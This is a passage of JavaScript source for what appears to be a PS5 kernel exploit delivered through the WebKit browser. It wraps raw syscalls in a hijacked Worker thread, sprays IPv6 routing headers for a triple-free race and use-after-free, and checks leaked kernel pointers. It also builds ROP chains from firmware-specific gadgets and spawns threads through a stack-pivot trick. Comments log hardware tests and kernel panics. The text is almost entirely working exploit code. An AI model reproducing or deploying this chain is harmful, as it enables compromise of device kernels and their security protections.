 *
 * rop-worker instead runs the chain on a sacrificial Worker thread and returns
 * through setjmp/longjmp. Proven on hardware: getpid -> 214 via both the async
 * and sync paths, match=true, 2 spins.
 *
 * syscallSync is used rather than the async variant deliberately: this file is
 * synchronous throughout and the race spins thousands of iterations, so
 * awaiting per syscall would need a full async refactor AND would destroy the
 * timing the triple-free depends on. The chain writes its own result and the
 * main thread busy-polls it, which is sound because the worker blocks in the
 * KERNEL on a condvar and libkernel's _umtx_op wake is an inline syscall on the
 * calling thread - so postMessage returns with the worker already runnable.
 */
function invoke(name, ...args) {
    const num = SYSCALL_NUMS[name];
    if (num === undefined)
        throw new Error("netctrl-ps5: no RE'd number for '" + name + "'");

    const rw = window.rop_worker;
    if (!rw || typeof rw.syscallSync !== "function")
        throw new Error("netctrl-ps5: rop_worker not loaded — "
                        + "refusing to fall back to the fatal runChain path");

    /* Name the syscall on failure. A blocking syscall issued on the hijacked
     * worker never returns, and the only symptom is rop-worker's generic
     * "sync poll timed out after N spins" - which cost a full console run and
     * a reboot to attribute to threads.drain()'s read. Wrapping here turns any
     * future occurrence into "'read' (3) ... timed out", naming the culprit
     * from the first beacon. */
    /* Once a syscall has timed out the Worker is still sitting in the kernel
     * on that call, and its stack/chain must not be touched again. Continuing
     * to drive it is what turned the first hang into a kernel panic, so every
     * later syscall fails fast instead - and the page sees NETCTRL_WEDGED and
     * refuses to re-arm rather than looping into another panic. */
    if (window.NETCTRL_WEDGED)
        throw new Error("netctrl-ps5: rop_worker is wedged in the kernel — "
                        + "refusing to issue '" + name + "'; reboot required");

    let r;
    try {
        r = rw.syscallSync(num, ...args);
    } catch (e) {
        const msg = (e && e.message) ? e.message : String(e);
        if (/timed out/.test(msg)) {
            window.NETCTRL_WEDGED = 1;
            /* sessionStorage, NOT localStorage. The flag must survive the
             * relentless loop's page RELOAD (window state is wiped there, so
             * the guard never fired and we re-armed on a wedged Worker plus a
             * half-freed ucred - that is what turned a hang into a panic).
             * But it must NOT survive a console reboot, which genuinely clears
             * the wedge: localStorage did, and then blocked every later run
             * with "REBOOT before retrying" on an already-rebooted console. */
            try { sessionStorage.setItem("netctrl_wedged", "1"); } catch (e) {}
        }
        throw new Error("netctrl-ps5: '" + name + "' (" + num + ") " + msg);
    }
    // syscalls return in rax; callers here expect a JS number, and negative
    // errno values must survive the BigInt -> Number conversion as signed.
    return Number(BigInt.asIntN(64, r.retval));
}

// Reports what is reachable BEFORE the race starts, so a missing primitive is a
// clean message rather than a panic three stages in.
function preflight() {
    const needed = Object.keys(SYSFALLBACK);
    const bad = syscallGaps();
    if (bad.length)
        throw new Error("netctrl-ps5 preflight: unreachable -> " + bad.join(", "));
    log("preflight ok — " + needed.length + " primitives reachable (" +
        Object.keys(SYSCALL_NUMS).length + " from the RE'd table)");
}

const sys = {
    socket(d, t, p) { return invoke("socket", S(d), S(t), S(p)); },
    socketpair(d, t, p, buf) {
        return invoke("socketpair", S(d), S(t), S(p), BigInt(buf));
    },
    close(fd)  { return invoke("close", S(fd)); },
    dup(fd)    { return invoke("dup", S(fd)); },
    setuid(u)  { return invoke("setuid", S(u)); },
    getuid()   { return invoke("getuid"); },
    open(path, flags, mode) { return invoke("open", BigInt(path), S(flags), S(mode)); },
    poll(fds, nfds, timeout) { return invoke("poll", BigInt(fds), S(nfds), S(timeout)); },
    getpid()   { return invoke("getpid"); },
    kqueue()   { return invoke("kqueue"); },
    sched_yield() { return invoke("sched_yield"); },
    // pipe2(fildes, flags); flags 0 == the old pipe(). See SYSCALL_NUMS.
    pipe(buf)  { return invoke("pipe2", BigInt(buf), 0n); },
    read(fd, b, n)  { return invoke("read", S(fd), BigInt(b), S(n)); },
    write(fd, b, n) { return invoke("write", S(fd), BigInt(b), S(n)); },
    ioctl(fd, req, arg) {
        return invoke("ioctl", S(fd), BigInt(req), BigInt(arg));
    },
    getsockopt(s, lvl, name, val, len) {
        return invoke("getsockopt", S(s), S(lvl), S(name),
                                BigInt(val), BigInt(len));
    },
    setsockopt(s, lvl, name, val, len) {
        return invoke("setsockopt", S(s), S(lvl), S(name),
                                BigInt(val), S(len));
    },
    // [PS5] four args, not two. See header note 1.
    netcontrol(slot, event, buf, buflen) {
        return invoke("netcontrol", S(slot), S(event),
                                BigInt(buf), S(buflen));
    },
    rtprio_thread(type, id, rtp) {
        return invoke("rtprio_thread", S(type), S(id), BigInt(rtp));
    },
    cpuset_setaffinity(level, which, id, setsize, mask) {
        return invoke("cpuset_setaffinity", S(level), S(which), BigInt(id),
                                S(setsize), BigInt(mask));
    },
    // issued only from worker threads (poops.c:512/529 bodies)
    recvmsg(fd, msg, flags) {
        return invoke("recvmsg", S(fd), BigInt(msg), S(flags));
    },
    writev(fd, iov, cnt) {
        return invoke("writev", S(fd), BigInt(iov), S(cnt));
    },
    readv(fd, iov, cnt) {
        return invoke("readv", S(fd), BigInt(iov), S(cnt));
    },
};

/* ------------------------------------------------------------ rthdr layer */

/* One worker round trip for a whole spray/probe sweep.
 * A syscall costs ~0.215 ms through the Worker (vs ~5 us native), so
 * find_twins' 300 syscalls per round were ~65 ms and the 5000-round budget
 * 5.4 minutes - long enough that a lost race costs a reboot and the browser
 * throws "page not responding" every time. Batched, a round is 2 round trips. */
function batch(calls) {
    const rw = window.rop_worker;
    if (!rw || typeof rw.syscallBatch !== "function")
        throw new Error("netctrl-ps5: rop_worker.syscallBatch missing");
    if (window.NETCTRL_WEDGED)
        throw new Error("netctrl-ps5: rop_worker wedged — refusing batch");
    return rw.syscallBatch(calls);
}

/* UNUSED - reverted. Measured on hardware: batching the spray was SLOWER
 * (78 ms/round vs 65 ms unbatched) because committing an 18 KB chain costs
 * 2250 wr64 calls through the WebKit write primitive every round, which is
 * dearer than the 150 syscalls it removes. It also panicked the console
 * during find_twins at round ~768, where the unbatched path grinds thousands
 * of rounds without incident. Kept only as a record of what was tried.
 *
 * A batched spray could still pay off if the chain were built ONCE and
 * re-fired - it is byte-identical every round - but that needs the
 * setjmp/longjmp context patched per fire, so it is not a small change.
 *
 * Spray every socket except the excluded ones, in ONE round trip.
 *
 * All the batched setsockopt calls necessarily point at the same spray buffer,
 * so tagging it from JS beforehand would give every socket the LAST tag. The
 * chain writes each tag itself instead, using the same
 * `mov qword [rdi], rax ; ret` gadget the store() helper uses - no per-socket
 * buffers (which would cost ~54 KB of an arena that is already ~80% spent).
 *
 * The 8-byte store covers 0x04..0x0B: 0x04 is poops' tag word and 0x08 is the
 * first rthdr address slot, which is never used for routing here (and is
 * identical across sockets anyway), so clobbering it is inert. */
function spray_rthdr_all(skipA, skipB) {
    const rw = window.rop_worker;
    if (!rw || typeof rw.syscallBatchTagged !== "function")
        throw new Error("netctrl-ps5: rop_worker.syscallBatchTagged missing");
    if (window.NETCTRL_WEDGED)
        throw new Error("netctrl-ps5: rop_worker wedged — refusing batch");

    const items = [];
    for (let i = 0; i < IPV6_SOCK_NUM; i++) {
        if (i === skipA || i === skipB) continue;
        items.push([BigInt(ST.spray_rthdr) + 0x04n,      // where to store the tag
                    BigInt((RTHDR_TAG | i) >>> 0),       // the tag itself
                    S(ST.ipv6_socks[i])]);
    }
    return rw.syscallBatchTagged(items, Number(SYSCALL_NUMS.setsockopt),
                                 S(IPPROTO_IPV6), S(IPV6_RTHDR),
                                 BigInt(ST.spray_rthdr), S(ST.spray_len));
}

function build_rthdr(buf, size) {           // poops.c:409
    const len = ((size >> 3) - 1) & ~1;
    wr8(buf, 0x00, 0);
    wr8(buf, 0x01, len);
    wr8(buf, 0x02, IPV6_RTHDR_TYPE_0);
    wr8(buf, 0x03, len >> 1);
    return (len + 1) << 3;
}
function set_rthdr(s, buf, len) {
    return sys.setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}
function get_rthdr(s, buf, lenPtr) {
    return sys.getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, lenPtr);
}
function free_rthdr(s) {
    return sys.setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
}

/* ------------------------------------------------------------------ state */

const ST = {
    ipv6_socks: new Array(IPV6_SOCK_NUM).fill(0),
    twins: [-1, -1],
    triplets: [-1, -1, -1],
    uaf_sock: 0,
    nc_slot: 0,
    iov_ss: [0, 0], uio_ss: [0, 0],
    spray_rthdr: 0n, spray_len: 0,
    leak_rthdr: 0n, leak_len_ptr: 0n,
    msg_hdr: 0n, msg_iov: 0n, tmp: 0n,
    uio_iov_read: 0n, uio_iov_write: 0n,
    master_pipe: [0, 0], victim_pipe: [0, 0],
    kq_fdp: 0n, kl_lock: 0n, curproc: 0n, allproc: 0n, fdt_ofiles: 0n,
};

function setLeakLen(n) { R.wr32(ST.leak_len_ptr, n >>> 0); }

/* Bytes the kernel actually copies for this socket's rthdr.
 * 0 == ip6po_rthdr is NULL (freed); 8 == present but zeroed; larger == live
 * content. RE: ip6_ctloutput 0xFFFFFFFF80862BA0 derives it as (ip6r_len+1)*8
 * from the chunk itself, so this is the only honest "is it still there" test. */
function rthdr_len(sock) {
    setLeakLen(0x40);
    get_rthdr(sock, ST.leak_rthdr, ST.leak_len_ptr);
    return rd32at(ST.leak_len_ptr, 0);
}

/* How many bytes ONE blocked recvmsg thread needs before it returns.
 *
 * RE'd, because a fixed byte count is wrong: in soreceive_generic
 * (0xFFFFFFFF8073F960) the ONLY MSG_WAITALL (0x40) test is at line 805, and it
 * guards the loop that goes back into sbwait (0xFFFFFFFF80B33300). Without
 * that flag - and we pass flags=0 - the call copies whatever is available and
 * returns SHORT. So the first thread to run consumes everything the wake
 * supplied and the rest stay blocked, still executing on the rop.slots the
 * next round is about to reuse.
 *
 * That is survivable while msg_iov[0].iov_len is 1 (the triple free: 4 threads,
 * 4 bytes, one each). It stops working the moment build_uio overwrites msg_iov
 * with a forged uio, which raises the per-thread resid to
 * 0x14 + size + 0 + size = 36 for an 8-byte slow read - so the old
 * IOV_THREAD_NUM-byte wake released exactly one of four threads and
 * reclaim_iov_over_uio could never converge. */
function iov_resid() {
    let n = 0;
    for (let i = 0; i < MSG_IOV_NUM; i++)
        n += Number(rd64at(ST.msg_iov, i * 0x10 + 8));
    return n;
}

/* A kernel-space uio gets NO fault protection, so a bad address is a panic
 * rather than an error. RE'd in uiomove (0xFFFFFFFF809ABDA0):
 *
 *     v20 = uio->uio_segflg;
 *     if ( v20 == 1 )                       // UIO_SYSSPACE
 *         sub_FFFFFFFF8049DB50(...);        // raw copy, no return value
 *     else if ( !v20 )                      // UIO_USERSPACE
 *         result = copyin/copyout(...);     // errno, and it IS checked
 *
 * build_uio sets segflg = UIO_SYSSPACE, so every slow read/write hands the
 * kernel a raw pointer to bcopy. leak_kqueue used to accept any NON-ZERO fdp,
 * which is how a plausible-but-wrong pointer reached that bcopy and panicked
 * the console. Nothing downstream can recover from that, so the address has to
 * be rejected here, before the kernel ever sees it.
 *
 * Canonical kernel half only: bits 63:47 set. That rejects 0, small integers,
 * and any userland pointer (our own leaks - libkernel 0x817ae8000, stacks
 * 0x7ef2a3000 - are all well below this). */
const KVA_MIN = 0xFFFF800000000000n;

function isKernelPtr(a) {
    const v = BigInt.asUintN(64, BigInt(a));
    return v >= KVA_MIN;
}

// Always beaconed, regardless of the race-time trace muting. Used only for
// facts we cannot afford to lose - a panic ends the session with no log.
function beacon(m) {
    /* Mirror to the on-screen log AS WELL as the server. These used to go only
     * to the host, so the console showed nothing but the cat and the operator
     * had to ask what was happening. Screen first - if the beacon XHR throws
     * or the host is gone, the line is still visible on the TV. */
    const scr = window.slopkit && window.slopkit.screenLine;
    if (scr) { try { scr(m); } catch (e) { /* ignore */ } }
    const b = window.slopkit && window.slopkit.mark;
    if (b) { try { b("NC " + m); return; } catch (e) { /* fall through */ } }
    if (!scr) console.log(m);
}

/* Resolve a libkernel symbol via the KERNEL dlsym (sys_dynlib_dlsym, syscall
 * 591) - the JS/libc dlsym is dead in WebKit, but the syscall works post-JB and
 * the kernel does the NID hashing. Signature: int(int handle, const char* name,
 * void** out). Try both libkernel handles (1, 0x2001), as elfldr does. */
let _resolveScratch = null;
function resolveSym(name) {
    if (!_resolveScratch) _resolveScratch = { out: mem.alloc(8), nbufCache: {} };
    let nbuf = _resolveScratch.nbufCache[name];
    if (!nbuf) {
        nbuf = mem.alloc(name.length + 1);
        for (let i = 0; i < name.length; i++) wr8(nbuf, i, name.charCodeAt(i) & 0xff);
        wr8(nbuf, name.length, 0);
        _resolveScratch.nbufCache[name] = nbuf;
    }
    for (const h of [1, 0x2001]) {
        R.wr64(BigInt(_resolveScratch.out), 0n);
        invoke("sys_dynlib_dlsym", S(h), BigInt(nbuf), BigInt(_resolveScratch.out));
        const a = R.rd64(BigInt(_resolveScratch.out));
        if (a !== 0n) return a;
    }
    return 0n;
}

/* On-screen PS5 notification. PREFERRED path: resolve
 * sceKernelSendNotificationRequest via syscall-591 and call the real wrapper
 * (correct by construction - the same call umtx2/elfldr make). FALLBACK: raw
 * /dev/notification0 write. OrbisNotificationRequest = 0xc30 bytes, message at
 * 0x2d, type=0 (matches netctrl.html's proven notify). Fully guarded. */
let _notifyFn = null;   // cached sceKernelSendNotificationRequest addr (0 = unresolved)
function sendNotification(msg) {
    try {
        const SIZE = 0xc30, MSGOFF = 0x2d, O_WRONLY = 1;
        const req = mem.alloc(SIZE);
        mem.bset(req, SIZE, 0);
        for (let i = 0; i < msg.length && i < 1000; i++)
            wr8(req, MSGOFF + i, msg.charCodeAt(i) & 0xff);

        if (_notifyFn === null) {
            try { _notifyFn = resolveSym("sceKernelSendNotificationRequest"); }
            catch (e) { _notifyFn = 0n; }
            beacon("notify resolve -> " + hex(_notifyFn));
        }
        if (_notifyFn && _notifyFn !== 0n) {
            // sceKernelSendNotificationRequest(0, req, 0xc30, 0) via a direct ROP
            // call (SysV: rdi,rsi,rdx,rcx). longjmp restores callee-saved regs.
            window.rop_worker.fireSync((c) => {
                c.pop("rdi", 0n);
                c.pop("rsi", BigInt(req));
                c.pop("rdx", BigInt(SIZE));
                c.pop("rcx", 0n);
                c.call(_notifyFn);
            });
            beacon("notify(dlsym) sent: " + msg);
            return;
        }

        // fallback: raw device write
        const path = "/dev/notification0";
        const pbuf = mem.alloc(0x20);
        for (let i = 0; i < path.length; i++) wr8(pbuf, i, path.charCodeAt(i));
        wr8(pbuf, path.length, 0);
        const fd = invoke("open", BigInt(pbuf), S(O_WRONLY));
        if (fd < 0) { beacon("notify open -> " + fd); return; }
        invoke("write", S(fd), BigInt(req), S(SIZE));
        invoke("close", S(fd));
        beacon("notify(dev) sent: " + msg);
    } catch (e) { beacon("notify err: " + (e && e.message)); }
}

/* Release the blocked iov threads. ONE byte, however many threads there are -
 * this is upstream's accounting (Poops.java: write(iovSs1, tmp, Int8.SIZE)),
 * and RE says why it works.
 *
 * In soreceive_generic (0xFFFFFFFF8073F960) the mbuf is dequeued AFTER the
 * copy, and the error path jumps over it:
 *
 *     v10 = uiomove(mtod(m)+moff, v58, a3);
 *     if ( v10 ) goto LABEL_255;            // release, skipping the dequeue
 *     if ( v58 == ... ) sbfree(v120, v18);  // only on success
 *
 * msg_iov[0].iov_base is 1 during the triple free and a kernel pointer once
 * build_uio has run, so the copyout ALWAYS faults and the byte is never
 * consumed. It therefore releases every blocked thread in turn and is still
 * queued afterwards - which is what reclaim_iov() takes back.
 *
 * Sizing this by resid * live (which I did) over-pays by ~144 bytes a round;
 * across IOV_SPRAY_ROUNDS that fills the peer receive buffer until the write
 * itself blocks, which is the "'write' (4) ... sync poll timed out" wedge. */
function wake_iov() {
    sys.write(ST.iov_ss[1], ST.tmp, 1);
}

/* Take the wake byte back, so the next round's threads block instead of
 * finding data already waiting. Upstream does a blocking read here; ours is
 * MSG_DONTWAIT (0x80 - honoured by kern_recvit, which returns 35/EWOULDBLOCK
 * on the flag or SS_NBIO) because a blocking read on iov_ss[0] is the fd the
 * threads park on, and getting that wrong has now wedged us three separate
 * times. Non-blocking also drains any leftover in one call. */
/* Non-blocking read for the MAIN thread. Every blocking read we have issued on
 * a socketpair the spray threads also use has eventually wedged the hijacked
 * Worker, and a wedged Worker is what becomes a kernel panic when the page
 * reloads and re-arms on dirty state. MSG_DONTWAIT (0x80) is per CALL, so
 * unlike FIONBIO it cannot stop the threads blocking on the same fd - RE'd:
 * kern_recvit tests `flags & 0x4080` and returns 35/EWOULDBLOCK.
 * Returns bytes read; <= 0 means nothing was available. */
function read_nb(fd, buf, n) {
    wr64at(ST.drain_iov, 0x00, BigInt(buf));
    wr64at(ST.drain_iov, 0x08, BigInt(n));
    return sys.recvmsg(fd, ST.drain_hdr, MSG_DONTWAIT);
}

/* Non-blocking WRITE for the main thread, same reasoning as read_nb.
 *
 * uio_ss[1] cannot take FIONBIO - the uio threads block in writev on that fd
 * BY DESIGN (set_sndbuf shrinks it so they do). But MSG_DONTWAIT is per call,
 * so sendmsg lets the main thread push bytes without ever parking. The plain
 * write() here wedged the Worker inside the kernel once the send buffer filled
 * ("'write' (4) ... sync poll timed out"), which then burned the whole retry
 * budget against the wedge guard. sendmsg = 28 (RE'd from sysent). */
function write_nb(fd, buf, n) {
    wr64at(ST.drain_iov, 0x00, BigInt(buf));
    wr64at(ST.drain_iov, 0x08, BigInt(n));
    return invoke("sendmsg", S(fd), BigInt(ST.drain_hdr), S(MSG_DONTWAIT));
}

/* Push exactly n bytes without blocking; short is reported, never hung. */
function write_wait(fd, buf, n) {
    let sent = 0;
    for (let i = 0; i < 4096 && sent < n; i++) {
        const r = write_nb(fd, BigInt(buf) + BigInt(sent), n - sent);
        if (r > 0) sent += r;
        else sys.sched_yield();
    }
    return sent;
}

/* Collect up to n bytes, giving up rather than blocking forever. A uio thread
 * that never spawned simply never contributes its `size` bytes, and the old
 * blocking read then hung the whole run - "'read' (3) ... sync poll timed
 * out". Returning short is always recoverable; hanging never is. */
function read_wait(fd, buf, n) {
    let got = 0;
    for (let i = 0; i < 4096 && got < n; i++) {
        const r = read_nb(fd, BigInt(buf) + BigInt(got), n - got);
        if (r > 0) got += r;
        else sys.sched_yield();
    }
    return got;
}

function reclaim_iov() {
    sys.recvmsg(ST.iov_ss[0], ST.drain_hdr, MSG_DONTWAIT);
}

/* Wait for the released threads to actually finish before reclaiming the byte.
 *
 * Both reference implementations have this and we did not: Poops.java blocks
 * in iovState.waitForFinished() and the PS4 netctrl.js does
 * `await Promise.all(iov_tasks)`, in each case BETWEEN the 1-byte write and
 * the 1-byte read-back. Our threads.wait() only clears bookkeeping - it never
 * waited for anything - so we could take the wake byte back while some threads
 * were still parked on it, leaving them blocked forever.
 *
 * thr_exit's state word (RE: kern_thr_exit 0xFFFFFFFF80686D10 does
 * suword(state, 1)) makes this a real barrier with no extra syscall.
 *
 * Bounded and non-fatal: after the cr_refcnt loop breaks the spray is left
 * blocked ON PURPOSE (upstream does the same), so threads legitimately outlive
 * a round. Timing out here just means "not all of them were mine to release",
 * and reclaim_iov is non-blocking either way. */
function barrier_iov() {
    /* Small budget on purpose. Every iteration costs a sched_yield, and a
     * syscall here is a Worker postMessage plus a busy-poll - orders of
     * magnitude dearer than the native calls both reference implementations
     * make. A released thread reaches thr_exit almost immediately, so this
     * normally exits in a handful of spins; a large budget only makes the
     * failure case unbearably slow. */
    for (let i = 0; i < 1024; i++) {
        if (threads.liveCount("iov") === 0) return true;
        sys.sched_yield();
    }
    /* Timing out here means we are about to touch the spray while threads are
     * still in flight - the exact nondeterminism that makes a run behave
     * differently from the one before it. All three reference implementations
     * wait unconditionally on an explicit completion signal (Poops.java
     * waitForFinished(), vue-after-free wait_for(worker.done, 1)); we keep a
     * bound only because a wedged Worker is unrecoverable. Say so loudly
     * rather than continuing silently. */
    beacon("[!] barrier_iov TIMEOUT, live=" + threads.liveCount("iov"));
    return false;
}

/* --------------------------------------------------------------- threads */

// poops.c:331-390 spins worker threads that park in a blocking recvmsg/readv so
// the sprayed iov/uio objects stay pinned across the race window. They need no
// R/W of their own, only the ability to issue one blocking syscall, so they are
// native threads rather than Workers (see THREADS in the header).
// poops.c's workers are PERSISTENT: each parks in worker_wait_for_work(), does
// one blocking syscall, signals finished, loops. That shape needs a native code
// loop, which from here would mean building a shellcode blob like slopkit's
// aioshellcode.
//
// This port uses SINGLE-SHOT threads instead: per round, spawn N threads that
// each issue exactly one blocking syscall and exit. The observable effect on
// the heap is identical — N threads parked in recvmsg/writev/readv across the
// race window — and it needs nothing beyond the thr_new chain the runtime
// already builds. The cost is a thread spawn per worker per round, which is the
// main reason the *_SPRAY_ROUNDS budgets above may need raising on hardware.
/* ------------------------------------------- self-contained thread spawner */

// Why this exists instead of window.spawn_thread:
//
// lapse.js's init_threading() builds its thread on start_func = longjmp with a
// prepared jmpbuf. Those symbols come from slopkit's lapse-offsets.json, whose
// setjmp/longjmp entries pointed at DATA, not code — verified against
// libkernel_web, libkernel, libkernel_sys and libSceLibcInternal on both 10.00
// and 11.60. The console's own log agrees: LIBC-BASE-0xNaN, equations=0. So
// that path executes into nothing and takes the renderer with it.
//
// (lapse-offsets.json no longer carries bad values — every firmware's
// setjmp/longjmp is now recovered by matching the real function prologue in
// libkernel_web and disassembles correctly. That does NOT resurrect the libc
// path: this spawner is kept because it needs no libc at all, which is a
// stronger property than having the two symbols be right. The note is left
// standing so nobody "fixes" the offsets and assumes init_threading is usable.)
//
// The trick that avoids libc entirely: thr_new invokes start_func(arg) with
// rdi = arg. Point start_func at `mov rsp, rdi; ret` and the new thread's stack
// becomes `arg` — so `arg` is simply a ROP chain, and it starts running. Every
// gadget used is one this port verified by disassembly.
//
// struct thr_param (amd64, 0x68 bytes):
//   +0x00 start_func   +0x08 arg        +0x10 stack_base  +0x18 stack_size
//   +0x20 tls_base     +0x28 tls_size   +0x30 child_tid   +0x38 parent_tid
//   +0x40 flags        +0x48 rtp        +0x50 spare[3]
const THR_PARAM_SIZE = 0x68;
const THR_STACK_SIZE = 0x8000;
const THR_CHAIN_SIZE = 0x400;

const rop = {
    fwkey: null, wk: 0n, lk: 0n, slots: [],

    bind() {
        const sk = window.slopkit || {};
        const fw = String(sk.FW_VERSION || "");
        if (!GADGETS[fw])
            throw new Error("netctrl-ps5: no verified gadget set for fw '" + fw +
                            "' (have " + Object.keys(GADGETS).join(", ") + ")");
        if (!sk.webkitBase || !sk.kernelBase)
            throw new Error("netctrl-ps5: slopkit.webkitBase/kernelBase missing");
        this.fwkey = fw;
        this.wk = BigInt(sk.webkitBase);
        this.lk = BigInt(sk.kernelBase);
    },

    g(name) {
        /* EXTRA_GADGETS is consulted too, not just GADGETS.
         *
         * gadgetsFor() already merges the two for rop-worker, but rop.g did
         * not — so anything only in EXTRA_GADGETS (mov_qword_rdi_rax, and the
         * mov_rax_deref_rdi / inc_rax that p2jb's counter needs) threw
         * "gadget missing" when a chain built here asked for it. Both tables
         * are libSceNKWebKit-relative, so the base rule is unchanged. */
        const rva = GADGETS[this.fwkey][name] !== undefined
                  ? GADGETS[this.fwkey][name]
                  : (EXTRA_GADGETS[this.fwkey] || {})[name];
        if (rva === undefined)
            throw new Error("netctrl-ps5: gadget '" + name + "' missing for fw "
                            + this.fwkey);
        // syscall_wrapper is the only one from libkernel_web
        return (name === "syscall_wrapper" ? this.lk : this.wk) + rva;
    },

    /* Off during the triple free (timing), on for the KRW reclaims (UMA
     * per-CPU cache). Flipped in make_karw. */
    pin: false,

    /* A/B (2026-08-08): spray-thread rtprio (Phase 2). Gave 2 quick lands then a
     * long self=all streak - ambiguous. Set FALSE here to revert to baseline
     * (no spray-thread realtime prio) and compare the twins-land rate. Flip back
     * to true (or delete this) if landing is worse without it. */
    rtprio: false,

    // Preallocated so the race never waits on an allocator.
    init(n) {
        for (let i = 0; i < n; i++)
            this.slots.push({
                param: mem.alloc(THR_PARAM_SIZE),
                chain: mem.alloc(THR_CHAIN_SIZE),
                stack: mem.alloc(THR_STACK_SIZE),
                tls:   mem.alloc(0x1000),
                /* 0x18, not 0x10: thr_new writes the new tid to BOTH
                 * child_tid (+0x00) and parent_tid (+0x08), so neither can
                 * double as an exit flag. +0x10 is ours alone - spawn() zeroes
                 * it and kern_thr_exit (0xFFFFFFFF80686D10) stores 1 there via
                 * suword before thread_exit. That is the liveness test that
                 * stops us rewriting the stack of a thread that is still
                 * running on it. */
                tid:   mem.alloc(0x18),
                busy:  false,
            });
        log("thread pool: " + n + " slots, gadgets from fw " + this.fwkey);
    },

    // One blocking syscall, then thr_exit. Mirrors iov_thread_fn/uio_thread_fn
    // (poops.c:512/529) minus their wait/signal loop.
    spawn(slot, num, a1, a2, a3) {
        const c = slot.chain;
        let o = 0n;
        const put = (v) => { wr64at(c, o, v); o += 8n; };

        /* Pin to MAIN_CORE and take realtime priority BEFORE blocking, exactly
         * as upstream's worker threads do:
         *     public void run() { cpusetSetAffinity(MAIN_CORE); rtprioThread(256); ... }
         * (Poops.java IovThread.run / UioThread.run)
         *
         * This is not cosmetic. UMA keeps PER-CPU bucket caches, so a chunk
         * freed on core 5 goes to core 5's cache; a thread allocating on any
         * other core draws from its own cache and can never see it. Our
         * spawned threads were unpinned, which produces exactly the symptom we
         * measured - spawned=4, liveAtCheck=4, a live readable chunk, and
         * nonzeroRounds=0/512, with every other part of the chain correct.
         *
         * Arg 4 goes in rcx: the libkernel syscall_wrapper does the
         * `mov r10, rcx` itself, which is why 5-arg calls already work from
         * the main thread (rop-worker uses the same register order). */
        /* ...but ONLY where the reclaim needs it. Measured: with the pin on
         * during the triple free, three consecutive runs failed to reach the
         * KRW stage at all (twins exhausted 5000, a panic mid-find_twins,
         * triplet[1] exhausted 5000), where the three runs before it reached
         * that stage every time.
         *
         * Cause is our per-round spawn model, not the pin itself: upstream
         * pins its workers ONCE and they park forever, while we create and
         * destroy four realtime-priority threads on core 5 every round - the
         * same core and priority as the main thread - which wrecks the timing
         * the triple-free race depends on.
         *
         * So pin only for the KRW-stage sprays, where UMA's per-CPU bucket
         * cache genuinely requires it and no race timing is at stake. */
        if (rop.pin) {
            put(this.g("pop_rdi"));  put(BigInt(CPU_LEVEL_WHICH));
            put(this.g("pop_rsi"));  put(BigInt(CPU_WHICH_TID));
            put(this.g("pop_rdx"));  put(0xFFFFFFFFFFFFFFFFn);   // -1 = this thread
            put(this.g("pop_rcx"));  put(BigInt(CPU_SET_SIZE));
            put(this.g("pop_r8"));   put(ST.cpu_mask);
            put(this.g("pop_rax"));  put(SYSCALL_NUMS.cpuset_setaffinity);
            put(this.g("syscall_wrapper"));
        }

        /* rtprio (realtime priority) on the spray thread. Split OUT of the
         * rop.pin block 2026-08-08: cpuset_setaffinity is EPERM and pinning
         * sprays is HARMFUL (FAILS #5), but rtprio is neither - it is EPERM-free,
         * matches upstream's rtprio-256 workers, and the MAIN thread already
         * takes it (beacon rtprio=0). Gating both together left the sprays at
         * DEFAULT priority. Runs at spawn only (a handful of times), not in the
         * hot loop. A/B toggle: set rop.rtprio=false to revert. */
        if (rop.rtprio !== false) {
            put(this.g("pop_rdi"));  put(BigInt(RTP_SET));
            put(this.g("pop_rsi"));  put(0n);
            put(this.g("pop_rdx"));  put(ST.rtp);
            put(this.g("pop_rax"));  put(SYSCALL_NUMS.rtprio_thread);
            put(this.g("syscall_wrapper"));
        }

        put(this.g("pop_rax"));  put(BigInt(num));
        put(this.g("pop_rdi"));  put(BigInt(a1));
        put(this.g("pop_rsi"));  put(BigInt(a2));
        put(this.g("pop_rdx"));  put(BigInt(a3));
        put(this.g("syscall_wrapper"));
        /* Retire the thread, and have it announce that it has done so.
         * thr_exit(state) with a non-NULL state does suword(state, 1) and an
         * umtx wake before thread_exit - RE'd at 0xFFFFFFFF80686D10 - so this
         * costs nothing and gives us the only reliable "slot is free" signal.
         * Passing 0 here (as this did) is why slots looked reusable while
         * their threads were still blocked in recvmsg. */
        put(this.g("pop_rax"));  put(SYSCALL_NUMS.thr_exit);
        put(this.g("pop_rdi"));  put(slot.tid + 0x10n);
        put(this.g("syscall_wrapper"));

        wr64at(slot.tid, 0x10, 0n);        // cleared now, set to 1 on exit

        const p = slot.param;
        mem.bset(p, THR_PARAM_SIZE, 0);
        wr64at(p, 0x00, this.g("pivot_rdi_rsp"));  // start_func
        wr64at(p, 0x08, c);                        // arg -> becomes rsp
        wr64at(p, 0x10, slot.stack);
        wr64at(p, 0x18, BigInt(THR_STACK_SIZE));
        wr64at(p, 0x20, slot.tls);
        wr64at(p, 0x28, 0x1000n);
        wr64at(p, 0x30, slot.tid);
        wr64at(p, 0x38, slot.tid + 8n);

        // through invoke() like every other syscall - R.syscall is
        // lapse-runtime's fatal runChain path and must never be used here.
        const rv = invoke("thr_new", p, BigInt(THR_PARAM_SIZE));
        /* Occupied ONLY if a thread actually started. Setting this
         * unconditionally (as it was) permanently retires the slot whenever
         * thr_new fails: nothing ever writes the exit flag, liveCount can
         * never reach 0, and every later round both skips the slot AND burns
         * the whole barrier budget - one sched_yield round trip per iteration.
         * That is the "page isn't responding" freeze, not the race. */
        slot.busy = (rv === 0);
        return rv;
    },
};

const threads = {
    pending: { iov: [], uio: [] },
    // drain() has to know which syscall the uio threads are parked in, since
    // writev and readv unblock from opposite ends of the socketpair
    lastCmd: { iov: 0, uio: 0 },
    lastSpawn: { iov: -1, uio: -1 },

    spawn(kind, count) {
        this.count = count;   // validated up front so run() fails early
    },

    // One blocking syscall per thread, mirroring iov_thread_fn / uio_thread_fn
    // (poops.c:512, 529) minus the surrounding wait/signal loop.
    // How many of this kind's slots are still occupied by a live thread.
    liveCount(kind) {
        const n = (kind === "iov") ? IOV_THREAD_NUM : UIO_THREAD_NUM;
        const base = (kind === "iov") ? 0 : IOV_THREAD_NUM;
        let live = 0;
        for (let i = 0; i < n; i++) {
            const slot = rop.slots[base + i];
            if (!slot.busy) continue;
